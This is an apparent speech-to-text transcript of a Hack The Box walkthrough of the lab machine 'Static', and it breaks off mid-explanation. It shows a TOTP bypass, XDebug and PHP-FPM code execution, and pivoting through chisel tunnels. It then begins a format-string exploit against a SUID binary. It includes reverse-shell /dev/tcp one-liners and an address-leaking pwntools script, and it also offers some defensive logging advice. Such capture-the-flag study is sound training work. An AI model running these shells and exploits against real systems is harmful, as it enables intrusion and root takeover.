 what's going on youtube this is ipsec i'm doing static from hack the box and this box by itself wouldn't be that tough i think if you removed all the tunneling aspects it's got two different exploits that you have to do that are pretty much just identify the vulnerability down the exploit and run it and then at the very end there is a binary exploit but it's just a format string vulnerability that isn't really that tough to do once you think about it a little bit in hindsight none of the binary exploits are tough but anyways um the challenge comes into the very first step is bypassing mfa by downloading the secret and just generating your own pin you log in and you get a vpn key now that vpn may be unstable if you have a weird issue with your mtu the maximum transmission unit they will get into later because you're stacking different vpns on top of each other but in order to exploit the third box which has the format string vulnerability you have to exploit a web server and then that format string vulnerability can't reach back to you and you can't reach back to it so you have to set up a pivot that can talk through the web server to both of them and we use chisel for that but um let's just get into it because it'll make much more sense hopefully once you see it as always we'll begin with an end map so dash sc for default scripts sv enumerate versions oh a output of formats put in the nmap directory and call it static and then the ip address which is 10 10 10 246. this can take some time to run so i've already ran it looking at the results we can see a few ports open and one port closed the first one is ssh on port 22. its banner tells us it's a debian box the next one down we have is a closed port on 2 2 2 2 and what i normally see this port i think is going to be ssh just listening on a non-standard port and the reason why it's closed is because this port behaved differently than all the other ports on this box so chances are there's an iptables rule or just a firewall rule in general dropping the packets to this port the next thing we have is http on port 8080 and it's running apache and the banner also tells us it's a debian box the nmap script does run and tell us there is a robots.txt file and that has two directories slash vpn and ftp uploads so let's go take a look at port 8080. i'm going to go to 101010 246 port 8080 and we just get a blank page here but again nmap went to the robots.txt and if we do that if we type robots correctly we can see there's two directories so i'm going to go to slash vpn and huh oh wow um so this server is configured in a way where directories need that trailing slash normally that isn't a thing with um web servers uh i can probably share that again with this dot ftp uploads directory so if i go here we can see that one behaved so there's probably some weird um forwarding rule or something going on here because when i do slash vpn we get not found if i add this last slash it does so i'm thinking then like um apache there's a virtual host location that has vpn in it and then doing a proxy pass or something to a different thing just because it's really weird to need that trailing slash and we can see it's not like globally in this whole web server because if i do ftp underscore uploads it adds that slash for me so that's weird um i don't really know what else to say other than um there's some good enumeration you can do through that so i'm just gonna download this d uh gun zipped file and also take a look at warning dot text that just says binary files are being corrupted during transfer check if recoverable so let's go and copy the files we downloaded so i'm gonna make dir downloaded we'll go in there and move downloads uh what was it uh ftp no [Music] uh db sql gz here and we can try gunzip d to extract it and we have a error message now if we use a tool called zcat which is going to be cat but it will uncompress as it goes it will uncompress everything up to that air and just looking at this it does look like some things are slightly off like um the co3 nt like this string doesn't look correct but two increment does uh we have a username admin and then over here looks a bit weird this looks like um is that a md5 sum if i do echo dash n wc-c 43 characters so maybe this is a shot one sum and there's some junk at the end and then we have this echo dash n wc-c 18 characters so i'm guessing this is supposed to be 16. if we look at this create table statement we can see uh usernames have a max of 20. generally with usernames it could be 1 through 20 characters so what i meant by that is usernames aren't fixed length it could be any number of characters this password being var care it's probably a hash which is a fixed length string and a hash of 40 characters is most likely a sha-1 sum and then we have this t-o-t-p which is normally a one-time pad so this is like a google authenticator or something doing multi-factor authentication and that's limited at 16 characters so i'm guessing uh the one time pad is going to be this field and the hash is going to be this field and either the one time pad is going to be the first 16 or the last 16 of this and vice versa for this hash however we can probably fix this gunzipt archive i'm just going to google fix gz fix gz github and see if there's a good application to do this looks like there is uh it's a c plus program and they gave us a exe but not a l file for linux so let's just download this and compile it so i'm going to go opt get clone and we'll go into fix gzz or fix gz i'm going to do g plus plus to compile this dot c plus plus o fix gz for output and it looks like it compiled successfully so i'm going to go back to the previous directory which unfortunately was slash opt so uh hdb static downloaded and i'm going to run up fix gz fix gz against this and the output how we do it it's bad as the first argument fixed as the second so i'm going to call it fixed db.sql and i'm going to unzip dash d on this file and no more error messages so if i cap this we can see this looks much cleaner than what the zcat did um and looking at this we can see this was the last 16 and then this hash let's see oh this added characters so we never would have got that hash so that's interesting but let's just grab the good hash and we can try to figure out exactly what this is we could send it to hashcat but i'm just going to try a few things first and the first thing i try is the username admin if i do sha1 sum we can see that is a match and i'm going to guess this database entry goes to that vpn portal so let's try admin admin in the vpn portal and we do log in and we get a two-factor enabled and we also have the two-factor code that is going to be this but in order for this to work our time has to be synced with the server i'm going to go back to that nmap script real quick and map static.nmap and it didn't tell me if my um time was incorrect so maybe the time is actually synced i'm going to do vi um we'll call this otp.pi and then i'm just going to import pyotp i think i have this library installed python3 import pyotp it looks like yes it is and how we use this is just um trtp is equal to py dot totp and then the secret key and i need to go copy that so cat downloaded fixed and let's grab this i guess i didn't have to create a script to do this i could just do this in the python command line but uh yeah so let's do print this python3 otp typo py object let's see google.com pyotp example see how do they use this tutp verify uh totp dot now it looks like so we can do dot now and we get this code so i'm probably gonna have to try this twice because this login may have failed so let's try admin admin then we run this again the totp is still the same and we go back to the username so our time is not synced we could probably run a sync with the ntpq command i think uh before we do that let's check if ndp is open so sudo nmap dash su ntp i want to say his port like 123 maybe uh ntp port uh let's see yep port one two three ten ten ten two forty six and see if it is running it does say it is open or open or filtered um let's see ntpq and 10 10 10 246 no that's not the command shoot ntp date is what i think i want 10 10 10 2 46 i'm gonna run the date command before and after and we probably have to do sudo so it's now syncing the time with the server no suitable synchronization found see that did not work i'm going to try putting it into my actual script so let's go into otp.pi and we can import ntp lib then from time import c time c is equal to ntp lib and dp client and then time is equal to c dot request 10 10 10 2 46 and print time is that gonna work python3 otp oh let's see is it time dot tx time i think so we do get a time back if i i was going to say google this to a time let's see epoch to date i'm probably going to hate myself for doing this because of time zones but we can still try it real quick uh 1729 gmt and this is saying the same time i think thursday december 16th 5 29 yeah that's weird let's see if i do this totp now and then let's print totp at and we can say time dot tx time see if we get different things for this line ten two parentheses we do so let's try that second one of querying it with the server time admin admin one two one three six nine and there we go we get in um i'm not exactly sure where my mistake was but i do want to talk about this in general something a bit different if you're a defender and doing some type of logging i would highly recommend having a dashboard that looks at the http response codes of these pages because if you have a single ip address and the access log get multiple 200 okays which sounds weird because you think 200 is success but in the case of most logins a 200 is actually a failure because it just says 200 okay bad password on a successful login generally it redirects people away from the login panel so you'd want to look for a single ip address heading vpnlogin.php and getting multiple 200 okays because that's indicative of a password spray and then upon a 302 redirect if you see that then the password spray was successful and that's something you should actually alert on because um one ip address getting like five failed login attempts and then it's successful that's now interesting and then the additional thing you could look at is people that get the um 200 okay on this two factor page if you see people successfully uh hold on my intercept is acting weird if you see people successfully getting 200 on this page and then it never does a redirection away uh that's also suspicious it's most likely they entered their credentials in some type of fishing thing and the attacker logged in but couldn't pass this two-factor thing but their password is still compromised so you should know that so definitely think about those things when setting up multi-factor authentication and is there a way for me to monitor when someone does a successful authentication but fails the multi-factor part because that is extremely important so let's log in here and see what we have it looks like we have this static inc internal it support portal and it has a few ip addresses and host names says this is offline but everything else is online it wants a common name here so i'm just going to do ipsec and click generate and see what it gives me and it's give me a open vpn file which is cool i'm going to copy the openvpn file to my current directory and then we can run it with openvpn now there's one thing i do want to mention um while i'm here and that's i'm going to tunnel two vpn connections i'm almost positive i'm going to run into issue down the line because i'm doing this and the issue i'm running into is going to be a mtu issue that is um maxible transmissible unit i believe and i think 1492 is the default that's 1492 bytes and what openvpn actually does is it appends bites to your packets and when you have just one openvpn connection that's not going to be an issue it's smart enough to know i'm going to hit 14.92 when you have multiple vpn connections going on that's when you can actually confuse the network interface because you create a packet then openvpn changes that packet makes it back to 1492 and then the second openvpn connection comes and then it actually makes the packet go above 1492 because it adds it's like 20 a 40 byte header i forget what openvpn's header size is but it adds that into the packet and you go above that and then just weird behavior happens whenever you try to do something that is a big packet it fails but if you do small packets it's successful and it's a really big pain to troubleshoot and the fix of that is using um a line called mss fix and doing like 1400 to set the mtu size for this tunnel but i'm not going to do it yet i just want to run into the issue um before i make any changes however i'm somewhat confident we will hit that later on this video so let's connect to the vpn and do sudo openvpn ipsec.ovpn and it's not connecting let's see oh um it's trying to hit vpn.static.hdb so let's make sure that resolves to the ip address so sudo vi etsy host and we can say 10 10 10 246 is that ip address so now when i run this we have a successful authentication i'm going to call this one to a vpn actually um that is confusing one ton i guess i don't know what to call that pain i'm gonna do the ipaddr and we can see the second vpn is on tonight now and my ip address is 172.309 but i don't know exactly what's behind this vpn i'm going to assume it's ips here the 172 17 and 20 and 30 network along with this so let's make quick um ip addresses for that so let's go here i'm just hitting the windows key the left and right arrow to do those auto resizes and i'm going to make dur vpn we'll go in here and v ip dot lst 172 172.170.0.24 172 20 0 0 24 172 300 24 192 168 254 0 24. i can also do a ip route command to see what my gateway is i'm going to grep it for ton 9. this can be everything that's going out this interface and let's um i hit the windows key up to make that full screen we can see there's only two actual routes and our list we have four different subnets and that could be just because of like cider notation but looking at this this 172 30 0 0 16 that means any of these octates can change so the ips begin with 30 and this 24 means this octet is the one going to be changing and we can see there is a route here to the 20 network and this 192 address that would not be included in this um there is a academy course on beginner to networking if you want to learn more about subnetting but quickly speaking if the uh this slash the subnet is zero through seven you know this is going to be changing 8 through 15 then 16 through 23 and then 24 through 32 would be this octet as you focus on but definitely check out the beginner networking course if you want a more thorough explanation because i helped write that course but um anyways let's go back to this uh the link source is 172.309 so anything that goes through ton 9 is going to go through this gateway so i'm going to do an or statement in grep by backslash pipe and we can also say 172 30 0 9 just in case any of these routing statements did not include device ton nine we can see it doesn't so what i'm going to do is just add a route to send uh these two subnets through uh this interface so i'm going to do sudo ip route add then 172 200 24 via 172.30 um probably one is what i should do let's see ping 172 30 0 1 yes that would be the gateway normally in networking um this admin generally uses the first or last ip for the router most likely it's gonna be the first which would be thirty zero one i could probably also do ip route via and use device but i always like using um the 178301 and we can see that here i think wait i'm confusing myself real quick ipadr i am 309 17 0 24. so yeah this is the gateway address okay um confuse myself for a second but we'll get there so sudo ip route add 172 20 0 0 24 via this 172 301 address which is the gateway so now let's just do a basic nmap so i'm going to do nmap sn this is going to be a ping only scan and um i think i capital l for input list i'm going to do vpnip.lst i think i have to save that lst and i'm going to oh a vpn for scan i guess and dash v so it shows me open host as it finds it and now we're doing a ping scan on those 24 networks uh the slash 24s i could have done one on that slash 16 but generally i avoid that because of just how many hosts there are when you do that and yeah so let's just wait for nmap to finish and then we can progress and map is done it did take about i want to say that's like three and a half minutes or four minutes um the one thing i probably could have done to speed that up i noticed at the very start of it said like parallel dns resolution or something if you had this dash n flag i'm almost positive it would speed it up but let's take a look at all the hosts that are up we just see bunch that say down hopefully the nmap output doesn't say that so i can do uh wait what cd map ls where did i put that scan os downloaded and map vpn for scan okay i put it in the vpn not the nmap directory i confuse myself sometimes but i can probably grab up on first scan and it doesn't have the host i can add a dash b1 for before and we can see all the ips that are up um but that's not the best way to go about it probably the gn map file would probably be the best because this is the grepable format that's what the g stands for so i could also just grab v either for up or well if i did up i wouldn't do dash v but dash v is going to exclude so i can exclude everything that says down and this is a much more pretty output because we're grepping the format that is meant for grep so yeah we can see 172 1701 21 31 and those are routers and we also see 10 11 and 9. so i'm going to focus on these because generally i don't like attacking the dot ones um the one thing i will generally check for is um the cisco smart install the see it s-i-e-t and i want to say that port maybe six seven eight nine or something um cisco smart install port s-i-e-t let's see what port that is oh come on sftp see it four seven eight nine four seven eight nine or eight six four seven eight six is the port i would definitely check on routers to be vulnerable i could have like s and mp and you can do things like that but this box isn't about tech attacking routers so let's go and check out these three ips uh let's do v host.lst go here host.lst 172 20 0 10 11 and 9. so 11. thirty zero nine and we can do an nmap scan here so nmap dash sc svoa and i'm just gonna call this we'll put in the actual nmap folder and call it host vpn and il for input list host.lsd the other thing we could do is check ttls on each of these ips so ping dash n1 172 301 and wait did that not ping okay is it dash c for linux yeah i always get that mixed up but that ttl is 64. it was 20 and 17 i think for the other two so 20 uh ttl 64 17 ttl of 64. i'm going to assume this is pretty much going to be the same box if i saw a ttl of like 255 or 254 i would be thinking this is a linux or a cisco box or some type of router anything honestly above 128 i would be taking a look at more in depth but let's see if that end map is finished it has so let's do less nmap host dot nmap and see what we have so on this box let's see 170 20 0 10 we have info.php and vpn on 2011 we have a mysql 309 we have port 3000 and nothing else if we go back to this last page let's see this vpn panel um 309 is that any of these no uh 20 do we have 2010 and 2011 2010 and 2011. so 2010 is web 2011 is db and 3009 we have no idea what that box is because it's not on this list so i'm going to check the um unknown box real quick on port 3000 so this port 3000 and we just get a apache test page so we probably should be running like go buster or something on this box carol-v 172-309 port 3000 i'm just looking at for the actual headers and let's see that's just saying it is apache so what was the other one 2010 i believe and we can see this one is telling us it's a ubuntu server which is different than debian so we know this box is completely different than uh the first box we attacked because that one was debian and this is ubuntu so let's try 172 20 0 10 and we have info.php and vpn i'm gonna try admin admin on this vpn and it says 2fa so let's python let's go here python3 otp.pi we can do this and this is looking like it is the same exact application so i'm thinking i may have missed something in my enumeration steps at the start of this box and i kind of hinted at it i believe but i want to test this real quick if i look at this yeah ubuntu so remember when i said there was something weird because when i did this um get slash vpn uh it was not found but i added the slash and it directed me somewhere i missed a piece of recon actually i kind of guessed at it but i could have looked at the server header because we see apache 2438 debian and when i add this slash two it's two nine ubuntu so we now know there is definitely um some type of proxy going on with that slash vpn slash um definitely should have looked at burp suite when i was doing this for the first time but yeah um i'm interested in that vpn or that info.php page because this wasn't accessible to us previously and this is just php info output if we had a lfi vulnerability somewhere we could probably weaponize that to get code execution but scrolling through this let's see if we see anything else interesting uh this is my sequel information ssl session x debug and if you remember a long time ago if i do ipsec.rocks and i search for xdebug there is a video exploiting this so let's just try the exploit on x debug to see if we can get it on this php info page to do that i'm going to go back into my terminal and we're going to switch to curl to test for this and then once we verify it's vulnerable we can play with it x debug if you send it the magic packet or the magic request it's going to respond back on port 9000 i learned that from doing olympus machine which was the first time i actually ever exploited this but we can do a curl 172 20 0 10 and then the magic request is x debug session start and then you can put anything here so you should just please subscribe to my channel and it doesn't respond back but if i try info.php it does connect back to me and we can see all this magical x debug stuff the one thing i'm really curious about is if it gives the x debug header letting me know that x debug is running so i'm going to do this curl dash v and i'm going to search my output for curl and in this header i don't see x debug and i'm gonna do info.php same thing search back for curl and that is done quite a bit because it's the php info page and i still don't see xdebug running so this is just i guess something good to test for because how i thought about it before when doing olympus is you see header you test but in this case header doesn't exist but it's still vulnerable that's probably because of a reverse proxy or something well not maxing this box directly i have no idea why the header's not there i don't know much about the exploit other than how to weaponize it um if you go through like github and look for exploit scripts it's all like russia chinese or python 2 which all three of those i hate working with so i just use xdebug the native way which is opening up chrome i'm going to google xdebug chrome app and we can just add to chrome add the application and now i can do this request because i think i'm listening on port 9000 now we can grab for nine thousand i am not because i did not click listen up here now we are listening and if i made that curl request again uh curl let's see x debug session start there we go we see i am now connected uh the other thing you could have done is just going all through chrome like leave that open and let's do chrome x debug plug-in i think there's a helper plug-in that if we install this at extension see let's make sure that extension is pinned 172 20 0 10 info.php let's make sure we are listening and that automatically sent that request to me so another way to do it to play with this we can click on this and now we should be able to run any php command so php system id oopsy daisy error evaluating code let's see maybe i have to set a breakpoint so i'm going to click on this when it's read i set a breakpoint let's stop listen refresh uh run something weird is going on twenty zero ten okay info.php stop listen refresh i'm not sure what i screwed up it's working oh wait i maybe step into let's see the error valuing code thing is probably i don't use php tags right no let's close this app and relaunch it i'm not sure what i screwed up but starting your things over is always good you can launch chrome apps by doing chrome colon slash apps click on x debug again listen refresh this page awesome okay i'm gonna click run and i think it finished the script let's go again working so let's see can i just run php commands here like system id error evaluating code php huh break on expression stop listen so i'm going to relaunch the app pause the video watch my olympus video and find out what i'm doing wrong because famous words but this should work so let me pause the video and check it out so i think the answer was i was putting a semicolon and i should not be putting a semicolon which is weird normally in like programming i'm used to always needing that semicolon but apparently you don't i'm going to run info.php and i'm going to click down here and we can try system id and semicolon we get that oopsy daisy valuing code don't put the um semicolon and it happily tells us it's www data so now we know we have code execution i can do bash dash c bash dash i dev tcp 10 10 14 oh no i probably shouldn't well we can try this 10 10 14 8 9 000 1 0 and 1. we can try it i don't think it's going to work the reason why being the ip address so nc lvmp 9001 we try to run this working and i don't get a call back but remember i'm on two vpn connections and the box i'm talking to may not know what 10 10 14 is but it probably knows what 172 309 is so let's try this um i wonder if i can just do it here 172 172.309 working and we get a shell awesome python3 import pty pty dot spawn pen bash oh shoot uh fg enter uh which python is python not here python3 awesome python3 c import pty pty spawn then bash st2y raw minus echo fg enter enter and now i have a shell on this box i'm going to do export term is equal to x term so i can clear the screen and we can close out a chrome because we don't need any more as long as we don't lose the shell so this is where i'm going to think we're going to have issues with the double tunnel so on this box let's see what do we want to do we'll probably want to check out the vpn and then if we look at database.php we can see there is we can see there is credentials so if i try typing like mysql it says command not found we could write like php scripts to dump the database if we wanted to because i'm assuming the mysql php module is installed because it's running this web app but the easiest way to do would just be tunneling it and to tunnel it i always like using chisel so if i do google chisel github it wouldn't be a video if i don't remember i disabled google in my search bar but go here let's download the latest release let's see amd 64. let's just download by clicking it in case it does a weird redirect and then we can move chisel or downloads chisel here and then gunzip dash d on the chisel application and move we'll make the dub dub dub and move chisel into that directory and i'm just going to call it chisel to make it easy so chmod plus x chisel so i can run it when i want to and python3 dash m http.server and let's go into our home and try wget on what is it 172.30 i think i was 8 000 chisel and we can see my connection is hanging we could play with a lot of things and always run into some weird issues and this is that um mtu issue i was talking about earlier in the video um if i just like make a web request let's do vindex dot well yeah v index.html hello world and we run this web server we try to download index.html we see it downloads just fine but if index.html gets to be too big it's not going to work so python3 dash c print a times let's try 1750 this should probably put it over that limit to index.html and run this web server we can see it now hanging because again it hit that limit um out of curiosity i'm going to try 1500 and let's just go in here python 3 dash m http server at 1500 it's failing um let's see let's change it to 14.50 i'm guessing this is still going to fail still fails if i change it to 1400 fail let's see let's just go to 1200 and see what happens this should succeed yeah it saved so you can see there's a weird thing with how big files are so what i'm going to do is very quickly change out the um mtu on this i think if i do ipaddr we can see what the mtu is i know there is yeah mtu 1500 that's maximum transmission units so i'm just going to quickly do mss fix 1400 save it and then close out relaunch the vpn and if i do ipaddr still says the ton is 1500 but i think vp openvpn is going to be smart enough to resize things so now i do w get do i still have it my shell is still active and if i do one of these previous ones of 1750 it downloads it because that has been fixed so let's try downloading chisel now and i'm sure there's a bunch of other ways people have worked around this weird issue but this actually fixed at the source so i can't wait to read everyone's write-ups to see how they worked around this issue but move chisel one to chisel we can delete all these indexes and chmod plus x chisel and the one thing i want to do is md fives on both ends because we were working with some transfer issues before so i just want to make sure it all came through fine and md5 says it is the same exact binary so let's run chisel and we can tunnel to the my sequel so chisel server dash dash reverse to allow reverse tunnels and uh oh file chisel oh i download the mac version or darwin i should say i guess that's the joanna ward let's see what is that's linux amd 64. no that's arm amd64 let's just see if i can copy link wget that looks good rm chisel uh gun zip dash d this mv this to chisel and let's set that web server again server remove chisel from here and where's that w get command cd www there we go so now i should be able to ch mod plus x chisel chisel server reverse uh 8080 is in use dash p let's do 8001 and we can do dot slash chisel chmod plus x chisel chisel client uh 172 309 uh port 8001 i think that's how we connect to it nope probably colon and we need to specify what we want to forward i think reverse 3306 um localhost 3306 and i should make sure mysql is not listening doesn't look like it is so when i run this command connect i can look at this i am now listening on localhost and anything i send to this port gets sent through chisel and then to the wrong host um shoot i need to fix that tty sdty-a we want rows 13 columns 105. stty rose 13 calls 135. so now i hit up we go in and i forgot um we actually want a different host not localhost we want db so again what this is doing opening port 3306 on my box and then anything i send there it's going to this socket which is db3306 okay so now i should be able to do my sequel dash u uh that was root where is db db name there we go root dash p um we can just copy this password paste dash h i think capital h for um ip address uh maybe not through socket maybe lowercase there we go lowercase h i can do show databases uh show databases and we can see all the databases so we could probably um select load file etsy passwd and we could view things on this box but the main thing i'm curious about is what's in the database select or use static show tables select star from users and we just have the admin user so there's nothing really interesting in this database we could spend a lot of time trying to shell this box which may be possible but we could also go back to the reverse shell where we have this chisel running and see if this box can talk to anything that her vpn could not and my main goal is getting to [Music] this pk box because pki stands for public key infrastructure and generally if you can get onto their pki server you can sign certificates as them and pretty much earn the domain so based upon these names pki is probably really interesting and if i do a ipaddr command oh it doesn't even have ip that uh if config i can see i do have an ip on the same broadcast domain as pki so chances are i can talk to it uh we could also run like iprout and oh um is it netstat dash rn yeah we can see we also have a route that way um but by ping pki we see it does respond to me and we could try um and mapping this box through getting a static library but i'm just going to try curling it to see if port 80 is open then we can start attacking it um wget yes we have port 80 open so i should map that port back to me so what i'm going to do is that chisel command again and if you wanted to do static binaries um to do nmap through this by google or ipsec rock static nmap i would watch this video but it would probably take another 5-10 minutes of me doing that when content's already there so this is connecting back to me on port 8001 we want to do a reverse um i'm going to listen on port 8000 we're going to send it to pki on port 80. so now if i curl localhost 000 we get something weird localhost 8000 it is over a page if i control you there's nothing in the source if i do a dash v um we see it is engine x on ubuntu this is new we saw um the last ubuntu machine was running apache i believe we have this x powered by header this php fpm71 we could probably exploit db php fpm and find it uh exploit it and let's see there is a metasploit script and this so if i plus this md file or a search point uh dash x m for mirror or x for examine but i have to specify this we can see the exploit db page here but what i'm going to do is just google github and we'll search for the php version this php fpm and add exploit to it we see we go to a github page and it's a weird name tells us how to use it essentially we just execute the file with the url so i'm going to do is go into opt get clone because we have to build this it didn't have a release cd ph uip so go build and then we can yeah let's just go back to hdb where was i all right we can execute that here php here http 12701 port 8000 uh slash index.php there we go so it wants a page and looks like it is running status code 502 target's probably vulnerable so still just waiting on this and i think it also says it may not work the first time if it doesn't work please try again or something so it's not an exactly reliable exploit but it says success was able to execute command by appending this so now if i append this with id oh no we want to just curl it curl and run it a few times there we go we have this executing i'm not exactly sure what um is going on here i want to say we probably just poisoned like one php thread and fpm probably stands for like uh functional pool manager or something uh php fpm let's see what that stands for generally when i see pm i think pull manager uh fast cgi process manager is what it stands for so maybe there's threads and we poison one thread and that's why it doesn't work all the time but sometimes it does work um not exactly sure but we do have a way to get code execution so let's try to get a reverse shell so the first step to do it is let's go into repeater because repeater is life let's do host localhost port 8000 and i'm just going to try getting index.php to make sure i set this request up right and a is equal to bash dash c bash dash i dev tcp 10 10 14 oh no we want 172 30 0 9 port 9001 0 and 1. and then we can do that and that's why i like putting it into repeater so i can see exactly how the url encoding is working and send this a few times and it hung i'm assuming that time it tried to do a shell but we're not getting a hit that's weird i'm going to try ping 127.001 and be sure always do a count when you do pings because on linux you just go indefinitely so i want to make sure this ping works i can see output and now let's try 172 309 oh i went too fast there we go and we get destination port unreachable so this host can't talk back to us but that's okay because we can use chisel and handle this so ipaddr if config i'm so used to the ip commands now so this time we don't want to do a reverse tunnel i'm going to specify 192 168 254.2 on port 9001 actually we'll do 9002 so it's obvious what's happening here and then we're going to send that to 172 30 0 9 on port 9001 if i did this correctly then this box should be listening on port 9002 on this interface and anything it gets it will forward it back through chisel to me on port 9001 so let's do what was i listening on nc right here so let's go here we can control z a few times to get back to our reverse shell and change this to be port 9002 and 192 168 254.2 i believe it was and we're waiting for it to hang or give an error so now it hung i go back to my prompt and i have a shell because it's going through that box it can talk to and i'm on the pki server now so python 3 c import pty pty dot spawn then dash control z um sdty raw minus echo fg and hit enter and now i'm on this box let's see ls uploads there's nothing here cat index we can see it is running this weird tool user bin ersa tool i'm going to actually let's just md5 summit real quick we have to specify user bin and i always like taking md5 sums and submitting it to virustotal so we can see if this is a unique binary or um something that exists out there and generally when you see no match is found and you submit a md5sum uh it's going to be unique so this is a custom coded binary which means we probably should look at attacking it i'm going to do a find slash and to dev null i'm going to grab it for ersa just see if there's anything else on this box that resembles that and we can see in user source there is source code to this so we don't have to do any fancy reverse engineering we can just do source code analysis to see if we can find any buffer overflows or anything of that nature so let's copy this whole thing and then we can v let's do make dev or make dir exploit v ersa dot er usa tool dot c paste the source code uh i think i screwed that up rm vi set mode to paste and then paste it there we go that looks better and we probably should also grab the actual file so user bin base64 ersa tool and grab it this way because i think it's small enough yep and i could probably just um copy it with like neck cad or something like that but i didn't feel like dealing with the tunnels clipboard is a good way to exfil data v ersa tool dot b64 paste it base64-d to ersa tool okay so now we can just analyze this source code and this whole part of the video is powered by hindsight this took much longer than hopefully it takes me here it probably took like two to three hours to figure out this whole binary exploitation chain and i'd help from oxdf as i was doing it so if i go over this quickly and you don't really understand how it's going so fast don't worry um but the first thing i notice is a lot of global variables up here i say the global because they're not within a function or anything so they're just up here and keep in mind the names ersa underscore dirt ta key ext etc but we look through this and if i equals 1 it's going to do this printf and getting or yeah printf and like saying what is the common name and then it's going to read a string from the user and assign it to the variable buffer if we keep going down we can see eventually it does a print f on this buffer string so this is a typical format string vulnerability of passing user input straight to print f if we keep going down eventually we'll see it doing this system cmd command after set uid 0 and it also changes the directory into ersa directory so this cmd looks like it is being populated let's see what is cmd it's being read in from this best print f and it's built upon this and it looks like this variable is easy rsa if we look at that um that is being built up here it's this ersa directory and then slash ezrsa with the print uh the format string vulnerability we have the ability to write data into memory and we can change variable names so if we change this e or sa underscore dir to from uh what is it opt easy rsa to like dev shm then we're going to control the directory it's executing a binary from as root and we can just create the file easy rsa make it a bash script and have it execute bash and get code execution that way so that is essentially going to be what we do and let's verify um the printf thing is as we expect so i'm going to execute this we do a help we can create print revoke or exit if i go to print this we have that cn and we can do a few p's for pointer and print some things out the one thing about format string vulnerabilities when you build it manually is if you do percent and then a number so one and i do dollar p i'm going to print the very first thing now if i do 2 percent to dollar p you guessed it i'm going to print the second thing so we can control whatever we put out here by doing this number the other thing that is a bit tricky is how you do padding in this so if i do that to p we have it just 0x5 if i do 16p that's going to write um or do padding for 16 characters if i grab this and we do echo dash n wc-c that's 16. if i wanted to zero pad it i could just add a zero here and do 16 and now it looks like a memory address if i do echo dash n do this wc-c it is indeed a memory address so that is the first piece of understanding this whole exploit is we can just leak things and on my said memory address that's just um a number the very first one was a memory address so if i just do percent 016p boom we leaked this address now the next piece to understand is there is aslr here so if i do print oh let's see percent 0 16 p and we do this a few times we can see the memory address does change every time but this piece stays the same so we should look at exactly what this is so i'm going to do is gdb ersa tool we can run it and then do print and we want percent 016 p and see what this address is if this address wasn't beneficial i do a bunch of p's and just look at each address but if i do x slash s on this uh hold on let's control c so we get into the gdp prompt then x slash s we can see that's ovpn it's kind and tells us it's the ext variable and if we looked at the source code vim ersa tool dot c that is indeed the variable this ersa directory is kind of around it so we just want to find exactly where this is because aslr is an effect we know we can leak this and if we find the distance between this string the ext variable and the ersa underscore directory then we can calculate all the offsets and aslr doesn't matter now we could cheat and just do don't kill payne x slash s and we could do like and ext to print that and we could do x slash s e r s a der and we could get it this way but that's cheating because you normally won't have all these pretty variable names because it'd be completely stripped so what i would do is x slash 20xg take this and let's remove a few put zeros and kind of just walk it uh we actually don't need xg we can probably just do 20g probably yeah oh well we can just walk it and see what it is or a 20 s would this be better yeah this is probably better because you wouldn't have these variable names you just look at the string and see oh opt easy rsa that is at this zero 0f0 if we hit enter to go down again this ext is here so what i want to do is go into python i'm going to take that variable we're going to subtract it against this to find out the distance between the two and it's 111. we could hex it it's 6f as well so now when we do our leak we can easily leak this address and then we know where the next address we want is and um the aslr is an effect but it only changes whenever the um program restarts that's why when i did it before to demo it i got out of it and did everything through um the like argv but here i can show let's see i'm here 0 1 6 p if i do 0 1 6 p again it's staying the same because the program isn't reloaded and gdb also kills aslr so that's why you see all these fives but if i had done it and we have to go into exploit if we did it here we can see the address still isn't changing so we have the basis of what we want to do to create a parent script at least to link an address so let's create the script and then after we create the script we'll verify that we did all the calculations correct and we'll go into how to overwrite a variable so i'm going to call this exploit dot pi and we'll start our prone tool script so we'll do from pwn import star from there we go and p is equal to process ersa tool and then we want to read the prompt so p dot receive we do 64 we can say read prompt and we want to send line print to enter the menu let's see one more tab probably there we go enter menu then we want to receive until it asks us for the cn now we don't have to explain that one and then we after it gives us the cn we're doing send line and this is where we do the very first 0 16 p and we want to record this so leak is equal to p dot receive we can do a full 1024 actually if we just do 16 uh print leak let's see if this does it real quick i probably need logging.6s leak logging dot success week let's see what happens here real quick python3 exploit.pi process say no attribute percent s where did i screw up ersa tool ersa tool see stirring forgot a v r a c until logging has no attribute success s u s-u-c-c-e-s-s maybe info started stopped if i just print leak and then if i just do that there we go so now it's printing the address of where we suspect um ext is so what we want to do real quick is then calculate we can call this ext and then ersa der is going to be ext minus what was it one one one i think that was so we can now i want to try the logging again was it is it just log dot success instead of logging see bytes and int so we need to convert int into or this and to n like that it's in hex form so i probably need to tell it 16 like that leak is not defined ext let's see let's just print everything print and then ersa der we want to convert that into hex okay so what i'm going to do now we can say p dot interactive like that and i'm going to open up gdb so let's close this and do ps ef grab ersa tool and it is going to be this so gdb dash p for pid and now we are debugging this so if i do x slash s on this this should bring me to ext and if i do x slash s on this we are now ersa directory so we have leaked both of these successfully so let's just clean this code up a little bit and the first thing i want to do is figure out the log.success thing so let's try this again i'm going to actually read the error so let's see oh bytes is not text it probably wants strings or decode like that bet that'll work yup that does so i was passing it a byte and it wanted string so we can do log.success we can spay f string and we'll have ext leaked address and put that there like that and then this one can be log dot success and we can say ursa dur address and this is in int right now instead of doing the hex let's use format strings for good measure so we can say um we call this ersa der and then 0 16 x like that see we need to end that quote if i execute this again we have it looking a bit pretty i didn't really pad this um i wonder if i could do that real quick uh let's see p receive so if i did hint 16 like that i should have copied the script before making this change is this going to work 0x ext 016x is that going to work oh no i'm not going to confuse myself let's just go to how it was it was good enough not perfect but we knew what we were doing here so leaked address this is just um ext dot decode like that f string is expecting it to end okay so we have it working um the next piece is going to be a bit tougher to wrap the head around because we'll be writing stuff into this variable one at a time so if i do the percent 16 or what was it percent 016p we're just leaking this address now what we want to do is be able to control the address of something we can write so i have to make a payload for um this first uh let me go back a bit um the reason why we're going to be caring so much about padding is because this address has a null byte in a perfect world this doesn't have a null byte and we can just write this string to the beginning and we know exactly where this beginning string is with our printf's but we can't do that because the null byte here we'd write it like 3 0 7 7 0 a 9 d 5 5 and then the null bytes would come and then we do our format string payload but because these null bytes are happen this piece never happens however we could put this memory address on the other end of the payload we just have to figure out exactly where that is and when we do that we always have to be cautious about padding because our payload is after the junk instead of before it so what i'm going to do real quick is kind of spitball what i want to do so let's say um percent then this piece doesn't exactly matter probably um i just want to put something there and then we do a dollar and then we want to write characters lowercase e or something's like a hundred and something i think so i know i want 